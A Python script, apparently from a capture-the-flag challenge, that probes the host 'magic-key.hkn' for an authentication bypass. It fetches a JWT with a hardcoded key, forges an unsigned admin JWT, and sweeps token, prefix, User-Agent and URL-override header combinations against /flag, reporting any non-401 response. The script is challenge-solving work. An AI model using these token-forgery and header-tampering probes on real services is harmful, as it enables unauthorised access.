#!/usr/bin/env python3
import base64, json, time, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

TARGET = "magic-key.hkn"
KEY = "C%{6bSUAs52sI@$K8Ouk0"
KEY_PWD = "pwd:" + KEY
DECOY = "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA"
REAL_UA = "python-requests/2.31.0"

# Get a FRESH real JWT right now
r = requests.post(f"http://{TARGET}/keycheck", headers={"Content-Type": "text/plain"},
                   data=f"key={KEY}", timeout=5)
real_jwt = r.headers.get("JWT")
print(f"Fresh real JWT: {real_jwt}\n")

header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

candidates = {
    "key": KEY,
    "key_pwd": KEY_PWD,
    "decoy": DECOY,
    "real_jwt": real_jwt,
    "forged_jwt": forged_jwt,
}

hits = []
for label, val in candidates.items():
    for prefix in ("", "Bearer "):
        token_val = f"{prefix}{val}"
        for ua in (None, REAL_UA):
            for path_header, path_header_name in [("/flag", "URL-Maybe"), ("/flag", "URL")]:
                headers = {"Session-Token": token_val, path_header_name: path_header}
                if ua:
                    headers["User-Agent"] = ua
                for path in ("/flag", "/next_chars"):
                    params = {"char": "s"} if path == "/next_chars" else None
                    try:
                        resp = requests.get(f"http://{TARGET}{path}", params=params, headers=headers, timeout=4)
                    except requests.exceptions.RequestException as e:
                        continue
                    if resp.status_code != 401:
                        hits.append((label, prefix, ua, path_header_name, path, resp.status_code, resp.text[:300]))
                        print(f"!!! HIT: val={label} prefix={prefix!r} ua={ua} header={path_header_name} path={path} -> {resp.status_code}: {resp.text[:300]}")

print(f"\nTotal non-401 hits: {len(hits)}")
if not hits:
    print("Still all 401.")
